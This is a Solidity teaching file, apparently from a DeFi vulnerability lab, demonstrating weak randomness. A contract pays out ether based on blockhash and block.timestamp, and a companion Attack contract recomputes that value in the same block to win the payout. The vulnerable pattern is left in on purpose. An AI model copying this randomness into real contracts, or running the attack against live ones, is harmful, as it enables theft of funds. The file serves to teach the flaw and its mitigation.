// SPDX-License-Identifier: MIT
// Source: https://github.com/SunWeb3Sec/DeFiVulnLabs
// Vulnerability: Weak Randomness
pragma solidity ^0.8.18;

/*
Name: Weak Randomness Vulnerability

Description:
Using block.timestamp, blockhash, or other on-chain data for randomness is insecure
as miners can manipulate these values. An attacker in the same block can compute
the same "random" value.

Mitigation:
Use a verifiable random function (VRF) like Chainlink VRF.
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    // VULNERABILITY: Weak randomness using on-chain data
    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

// Attack contract that computes the same "random" value
contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        // Compute the same answer since we're in the same block
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        guessTheRandomNumber.guess(answer);
    }
}
